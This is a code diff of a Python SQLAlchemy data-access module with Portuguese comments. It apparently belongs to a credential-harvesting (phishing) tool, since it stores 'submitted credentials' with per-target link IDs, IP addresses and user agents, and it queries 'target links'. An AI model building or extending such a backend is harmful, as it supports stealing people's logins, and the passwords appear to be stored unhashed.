@@ -1,60 +1,45 @@
+from datetime import datetime, timezone
 from sqlalchemy.orm import Session
+
 from app.backend.db import models, schemas
 
-def create_user_data(db: Session, user_data: schemas.UserDataCreate):
+
+def create_user_data(db: Session, data: schemas.UserDataCreate):
     """
-    Cria um registro de usuário no banco de dados com base nos dados recebidos.
+    Insere um registro completo de credenciais submetidas.
+    data.link_id, data.timestamp, data.ip_address e data.user_agent
+    estarão disponíveis graças ao schema acima.
     """
-    novo_user = models.UserData(
-        email=user_data.email,
-        password=user_data.password
-        # Se houver outros campos, inclua aqui
-    )
-    db.add(novo_user)
+    db_obj = models.UserData(**data.model_dump())
+    db.add(db_obj)
     db.commit()
-    db.refresh(novo_user)
-    return novo_user
+    db.refresh(db_obj)
+    return db_obj
+
+
+
+# --------------------------------------------------------------------------- #
+# UTILITÁRIOS (caso você ainda use em outro lugar do projeto)
+# --------------------------------------------------------------------------- #
 
 def get_user_data(db: Session, user_id: int):
-    """
-    Retorna um registro de usuário baseado no ID.
-    """
     return db.query(models.UserData).filter(models.UserData.id == user_id).first()
 
+
 def get_all_user_data(db: Session, skip: int = 0, limit: int = 100):
-    """
-    Retorna uma lista de registros de usuário.
-    """
     return db.query(models.UserData).offset(skip).limit(limit).all()
 
-def update_user_data(db: Session, user_id: int, updated_data: schemas.UserDataCreate):
-    """
-    Atualiza os dados de um registro de usuário existente.
-    """
-    user = db.query(models.UserData).filter(models.UserData.id == user_id).first()
-    if not user:
-        return None  # ou levantar uma exceção
 
-    # Atualiza os campos; supondo que queremos atualizar email e password
-    user.email = updated_data.email
-    user.password = updated_data.password
-    db.commit()
-    db.refresh(user)
-    return user
 
 def delete_user_data(db: Session, user_id: int):
-    """
-    Remove um registro de usuário do banco de dados pelo ID.
-    """
-    user = db.query(models.UserData).filter(models.UserData.id == user_id).first()
-    if not user:
-        return False  # ou levantar uma exceção
-    db.delete(user)
+    obj = db.query(models.UserData).filter(models.UserData.id == user_id).first()
+    if not obj:
+        return False
+
+    db.delete(obj)
     db.commit()
     return True
 
+
 def get_target_links(db: Session):
-    """
-    Retorna todos os target links do banco de dados.
-    """
     return db.query(models.TargetLink).all()
